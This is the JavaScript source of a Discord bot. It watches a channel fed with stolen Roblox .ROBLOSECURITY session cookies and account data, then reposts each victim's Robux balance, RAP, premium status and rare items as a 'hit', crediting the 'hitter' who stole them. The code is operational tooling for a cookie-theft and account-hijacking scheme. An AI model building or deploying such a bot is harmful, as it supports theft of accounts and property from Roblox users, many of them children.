const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ─── CONFIG (set these in Railway → Variables) ────────────────────────────────
const BOT_TOKEN         = process.env.BOT_TOKEN;
const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID;
const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;

if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, TARGET_CHANNEL_ID');
  process.exit(1);
}
// ──────────────────────────────────────────────────────────────────────────────

// Your server's emojis
const E = {
  robux:   '<:robux:1479438036939833384>',
  rap:     '<:rap:1479437578405941299>',
  summary: '<:summary:1479437991930888354>',
  premium: '<:Premium:1479438456760303690>',
  korblox: '<:korblox:1479437718495821976>',
  headless:'<:headless:1479437752712953970>',
};

function stripEmojis(str) {
  return str.replace(/<a?:[a-zA-Z0-9_]+:[0-9]+>/g, '').trim();
}

function rebuildFieldValue(fieldName, value) {
  const name = stripEmojis(fieldName).toLowerCase();
  const lines = value.split('\n').map(l => stripEmojis(l));

  if (name.includes('robux')) {
    return lines.map(l => {
      if (/balance/i.test(l)) return `${E.robux} ${l.replace(/balance\s*/i, 'Balance ')}`;
      if (/pending/i.test(l)) return `${E.robux} ${l.replace(/pending\s*/i, 'Pending ')}`;
      return l;
    }).filter(Boolean).join('\n');
  }

  if (name.includes('rap')) {
    return lines.map(l => {
      if (/rap/i.test(l)) return `${E.rap} ${l}`;
      return l;
    }).filter(Boolean).join('\n');
  }

  if (name.includes('summary')) {
    return lines.map(l => l ? `${E.summary} ${l}` : l).join('\n');
  }

  if (name.includes('premium')) {
    return lines.map(l => l ? `${E.premium} ${l}` : l).join('\n');
  }

  if (name.includes('korblox')) {
    const emojis = [E.korblox, E.headless, E.korblox];
    return lines.filter(Boolean).map((l, i) => `${emojis[i] || ''} ${l}`).join('\n');
  }

  return value;
}

const KEEP_FIELD_NAMES = ['robux', 'rap', 'summary', 'premium', 'korblox'];

function cleanText(str) {
  return str.replace(/<[^>]+>/g, '').replace(/:[a-z0-9_]+:/gi, '').trim().toLowerCase();
}

function shouldKeepField(field) {
  const name = cleanText(field.name);
  return KEEP_FIELD_NAMES.some(kw => name.includes(kw));
}

client.once('clientReady', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
  console.log(`📤 Forwarding to: ${TARGET_CHANNEL_ID}`);
});

client.on('messageCreate', async (message) => {
  if (message.channel.id !== SOURCE_CHANNEL_ID) return;
  if (!message.embeds || message.embeds.length === 0) return;

  const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
  if (!targetChannel) return console.error('❌ Target channel not found.');

  // Step 1: get hitter name from cookie embed footer
  let hitterName = null;
  for (const embed of message.embeds) {
    const allText = [
      embed.title, embed.description, embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
      hitterName = embed.footer?.text?.trim() || null;
      break;
    }
  }

  // Step 2: forward hit data embed only
  for (const embed of message.embeds) {
    const allText = [
      embed.title, embed.description, embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
      console.log('⏭  Skipped ROBLOSECURITY embed');
      continue;
    }

    const keptFields = (embed.fields ?? []).filter(shouldKeepField);
    if (keptFields.length === 0) continue;

    const intro = hitterName
      ? `Wow @${hitterName} just getting a hit`
      : `Wow just getting a hit`;

    const rebuilt = new EmbedBuilder();
    rebuilt.setDescription(intro);
    rebuilt.addFields(keptFields.map(f => ({
      name:   stripEmojis(f.name) || f.name,
      value:  rebuildFieldValue(f.name, f.value),
      inline: f.inline ?? false,
    })));

    if (embed.color)          rebuilt.setColor(embed.color);
    if (embed.timestamp)      rebuilt.setTimestamp(new Date(embed.timestamp));
    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
    if (embed.author) {
      rebuilt.setAuthor({
        name:    embed.author.name    || '',
        iconURL: embed.author.iconURL || undefined,
        url:     embed.author.url     || undefined,
      });
    }

    await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
  }
});

client.login(BOT_TOKEN);
